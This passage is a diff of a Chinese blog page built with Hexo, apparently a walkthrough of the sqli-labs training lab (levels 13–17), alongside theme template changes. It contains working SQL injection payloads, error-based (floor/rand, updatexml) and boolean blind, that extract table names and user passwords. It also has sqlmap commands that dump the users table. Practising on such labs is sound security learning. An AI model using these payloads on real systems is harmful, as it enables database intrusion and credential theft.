+<span class="hljs-attribute">uname</span>=-1' union select count(*), concat((select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">'users'</span> limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a    #列出users下的列名，x表示你想爆第几列
+<span class="hljs-attribute">uname</span>=-1' union select count(*),1, concat((select concat_ws(<span class="hljs-string">'['</span>,password,username) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a#&amp;<span class="hljs-attribute">passwd</span>=1         #爆破出用户名和密码</code></pre>
+<p>这里要注意一点好像从第十一题开始select的参数只有两个了，可以用1’) order by n#测试一下，发现n为3的时候回报错，所以我们select只能选两个参数了<br>结果：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B782.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B783.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B784.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B785.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B786.JPG" srcset="/img/loading.gif" alt="picture"></p>
 <p>0x09 Less-14<br>和13关一样，就是改成双引号去闭合</p>
 <p>0x10 Less-15<br>这个应该是post类型的布尔盲注了，不过这里判断条件是login successfully还是failed</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;  and substr(database(),x,1)=&apos;x&apos;#&amp;passwd=1  #猜库名</span><br><span class="line">uname=admin&apos; and substr((select table_name from information_schema.tables where table_schema=database() limit x,1),x,1)=&apos;x&apos;%23  #猜表名</span><br><span class="line">uname=admin&apos; and substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit x,1),x,1)=&apos;x&apos;#&amp;passwd=1    #猜列名</span><br><span class="line">uname=admin&apos; and substr((select group_concat(password/username) from security.users limit x,1),x,1)         #猜出用户名和密码</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B787.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B788.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B789.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B790.JPG" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B791.JPG" alt="picture"></p>
+<pre><code class="hljs pgsql">uname=<span class="hljs-keyword">admin</span><span class="hljs-string">'  and substr(database(),x,1)='</span>x<span class="hljs-string">'#&amp;passwd=1  #猜库名
+uname=admin'</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> x,<span class="hljs-number">1</span>),x,<span class="hljs-number">1</span>)=<span class="hljs-string">'x'</span>%<span class="hljs-number">23</span>  #猜表名
+uname=<span class="hljs-keyword">admin</span><span class="hljs-string">' and substr((select column_name from information_schema.columns where table_name='</span>users<span class="hljs-string">' limit x,1),x,1)='</span>x<span class="hljs-string">'#&amp;passwd=1    #猜列名
+uname=admin'</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>/username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> x,<span class="hljs-number">1</span>),x,<span class="hljs-number">1</span>)         #猜出用户名和密码</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B787.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B788.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B789.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B790.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B791.JPG" srcset="/img/loading.gif" alt="picture"></p>
 <p>0x11 Less-16<br>和上面那题一样的道理，改成用“）闭合即可</p>
 <p>15-16题我觉得也可以试试sqlmap，正好没怎么用过，所以以15题为例，试了试sqlmap这个工具<br>首先由于是post类型，我们可以先抓个包，获取 HTTP 请求保存在post.txt中，让sqlmap自己去解析<br>1.爆库：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;post.txt&quot; --dbs    #-r:表示加载一个文件.--dbs:表示爆破库名</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B792.JPG" alt="picture"><br>2.爆破security下的表名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;post.txt&quot; -D security --tables   #-D:库名 --tables:表示爆破表名</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B793.JPG" alt="picture"><br>3.爆破users下的列名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;post.txt&quot; -D security -T users --columns   #-T:表名 --columns：表示爆破列名</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B794.JPG" alt="picture"><br>4.爆破username，password：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r &quot;post.txt&quot; -D security -T users -C &quot;username,password&quot; --dump   #-C:列名名 --dump：获取数据</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B795.JPG" alt="picture"><br>完事了</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">python2</span> <span class="hljs-selector-tag">sqlmap</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-r</span> "<span class="hljs-selector-tag">post</span><span class="hljs-selector-class">.txt</span>" <span class="hljs-selector-tag">--dbs</span>    <span class="hljs-selector-id">#-r</span>:表示加载一个文件<span class="hljs-selector-class">.--dbs</span>:表示爆破库名</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B792.JPG" srcset="/img/loading.gif" alt="picture"><br>2.爆破security下的表名：</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">python2</span> <span class="hljs-selector-tag">sqlmap</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-r</span> "<span class="hljs-selector-tag">post</span><span class="hljs-selector-class">.txt</span>" <span class="hljs-selector-tag">-D</span> <span class="hljs-selector-tag">security</span> <span class="hljs-selector-tag">--tables</span>   <span class="hljs-selector-id">#-D</span>:库名 <span class="hljs-selector-tag">--tables</span>:表示爆破表名</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B793.JPG" srcset="/img/loading.gif" alt="picture"><br>3.爆破users下的列名：</p>
+<pre><code class="hljs routeros">python2 sqlmap.py -r <span class="hljs-string">"post.txt"</span> -D security -T<span class="hljs-built_in"> users </span>--columns   #-T:表名 --columns：表示爆破列名</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B794.JPG" srcset="/img/loading.gif" alt="picture"><br>4.爆破username，password：</p>
+<pre><code class="hljs routeros">python2 sqlmap.py -r <span class="hljs-string">"post.txt"</span> -D security -T<span class="hljs-built_in"> users </span>-C <span class="hljs-string">"username,password"</span> --dump   #-C:列名名 --dump：获取数据</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B795.JPG" srcset="/img/loading.gif" alt="picture"><br>完事了</p>
 <p>0x12 Less-17<br>这道题是update注入，是报错注入的一种，主要运用sql内置函数uodatexml<br>updatexml函数介绍：<br>1<br>2    UPDATEXML (XML_document, XPath_string, new_value);<br>3    第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>4    第二个参数：XPath_string (Xpath格式的字符串) 。<br>5    第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>而我们的报错注入主要针对第二个参数，假设注入语句为：updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)，concat不符合xpath的语法，出现格式错误，报错内容即为数据库的版本，完成注入<br>接下来，我们在题目中看看<br>首先提一下，这里我看了源码之后发现，它对uname做了一大堆过滤，但是没对passwd做什么处理，所以注入点在passwd这里<br>首先还是列出库名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:uanme=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),3)#</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7143.JPG" alt="picture"><br>列出表名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)#</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs nix">payload:<span class="hljs-attr">uanme=admin&amp;passwd=1'</span> <span class="hljs-literal">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database(),<span class="hljs-number">0</span>x7e),<span class="hljs-number">3</span>)<span class="hljs-comment">#</span></code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7143.JPG" srcset="/img/loading.gif" alt="picture"><br>列出表名：</p>
+<pre><code class="hljs sql">payload:uname=admin&amp;passwd=1' and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name)<span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></code></pre>
 <p>1<a href="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7144.JPG" target="_blank" rel="noopener">picture</a><br>列出列名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x7e),1)#</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7145.JPG" alt="picture"><br>列出字段名：一开始，照之前的思路应该是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos;and updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1)#</span><br></pre></td></tr></table></figure>
-<p>但是他报错了，<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7147.JPG" alt="picture"><br>上网看了一下别的大佬的思路，payload是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select password from (select password from users where username=&apos;admin&apos;) mingzi ),0x7e),1)</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7146.JPG" alt="picture"><br>具体原因，上网查了一下是说：错误的意思是说，不能先select出同一表中的某些值，再同一个SQL语句中update这个表mysql 把 查询子句当做一个临时表，不在当做一个实体表</p>
+<pre><code class="hljs cs">payload:uname=admin&amp;passwd=<span class="hljs-number">1'</span> <span class="hljs-function">and <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">'users'</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-meta">#</span></code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7145.JPG" srcset="/img/loading.gif" alt="picture"><br>列出字段名：一开始，照之前的思路应该是：</p>
+<pre><code class="hljs lisp">uname=admin&amp;passwd=1'and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span> group_concat(<span class="hljs-name">password</span>) from security.users),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#</code></pre>
+<p>但是他报错了，<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7147.JPG" srcset="/img/loading.gif" alt="picture"><br>上网看了一下别的大佬的思路，payload是这样的：</p>
+<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&amp;passwd=1' <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,(select password <span class="hljs-keyword">from</span> (select password <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">'admin'</span>) mingzi ),0x7e),1)</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7146.JPG" srcset="/img/loading.gif" alt="picture"><br>具体原因，上网查了一下是说：错误的意思是说，不能先select出同一表中的某些值，再同一个SQL语句中update这个表mysql 把 查询子句当做一个临时表，不在当做一个实体表</p>
 
-    </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-                <a href="/2019/11/26/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" rel="next" title="sql注入笔记1（sqli-labs基础挑战，1-4关）">
-                  <i class="fa fa-chevron-left"></i> sql注入笔记1（sqli-labs基础挑战，1-4关）
-                </a>
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/12/02/%E5%85%A5%E9%97%A8%E7%BA%A7%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88Eric%EF%BC%89/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">入门级靶机实战（Eric）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2019/11/26/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">
+                        <span class="hidden-mobile">sql注入笔记1（sqli-labs基础挑战，1-4关）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
             </div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-                <a href="/2019/12/02/%E5%85%A5%E9%97%A8%E7%BA%A7%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88Eric%EF%BC%89/" rel="prev" title="入门级靶机实战（Eric）">
-                  入门级靶机实战（Eric） <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
+            
           </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-  </div>
-
-
-          </div>
-          
-
         </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
   </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <img class="site-author-image" itemprop="image" alt="Gee"
-    src="/uploads/1.jpg">
-  <p class="site-author-name" itemprop="name">Gee</p>
-  <div class="site-description" itemprop="description"></div>
 </div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">12</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">6</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="feed-link motion-element">
-    <a href="/atom.xml" rel="alternate">
-      <i class="fa fa-rss"></i>RSS
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-<div class="copyright">
   
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Gee</span>
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
-  </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.5.0
-  </div>
-<div class="busuanzi-count">
-  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="site-uv">
-      <i class="fa fa-user"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-    </span>
   
-    <span class="site-pv">
-      <i class="fa fa-eye"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-    </span>
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
     </div>
-        
+    
 
+    
 
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
+    
   </div>
+</footer>
 
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
-<script src="/js/schemes/pisces.js"></script>
-<script src="/js/next-boot.js"></script>
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-
-
-  
-
-
-
-
-  <script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
+<!-- Plugins -->
 
 
   
-
+    <script  src="/js/lazyload.js" ></script>
   
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "sql注入笔记2（sqli-labs  5-30）&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
